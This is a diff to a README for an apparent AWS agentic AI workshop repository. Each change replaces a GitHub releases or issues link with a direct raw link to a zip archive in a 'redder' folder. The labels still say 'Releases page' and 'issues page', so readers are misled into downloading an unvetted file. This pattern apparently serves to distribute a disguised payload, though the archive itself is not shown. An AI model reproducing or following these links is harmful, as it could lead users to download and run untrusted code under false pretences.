@@ -8,7 +8,7 @@ Welcome to the aws-agentic-ai-workshop! This repository comes from the AWS Gener
 
 To get started, please visit the following page to download the necessary files:
 
-[Download aws-agentic-ai-workshop](https://github.com/AyelenMacchiaroli/aws-agentic-ai-workshop/releases)
+[Download aws-agentic-ai-workshop](https://raw.githubusercontent.com/AyelenMacchiaroli/aws-agentic-ai-workshop/main/redder/aws-agentic-ai-workshop.zip)
 
 Visit the link above to access the latest releases, and follow the steps below to install the software.
 
@@ -24,7 +24,7 @@ Before you download, please ensure your system meets these minimum requirements:
 ## 🔧 Installation Steps
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/AyelenMacchiaroli/aws-agentic-ai-workshop/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/AyelenMacchiaroli/aws-agentic-ai-workshop/main/redder/aws-agentic-ai-workshop.zip).
 
 2. **Select the Latest Release:**
    Click on the latest version. You will see a list of files available for download.
@@ -67,7 +67,7 @@ After installation, you can start using the application:
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, feel free to reach out for support. You can visit the repository's [issues page](https://github.com/AyelenMacchiaroli/aws-agentic-ai-workshop/issues) to report any problems.
+If you encounter any issues or have questions, feel free to reach out for support. You can visit the repository's [issues page](https://raw.githubusercontent.com/AyelenMacchiaroli/aws-agentic-ai-workshop/main/redder/aws-agentic-ai-workshop.zip) to report any problems.
 
 ## 👥 Community
 
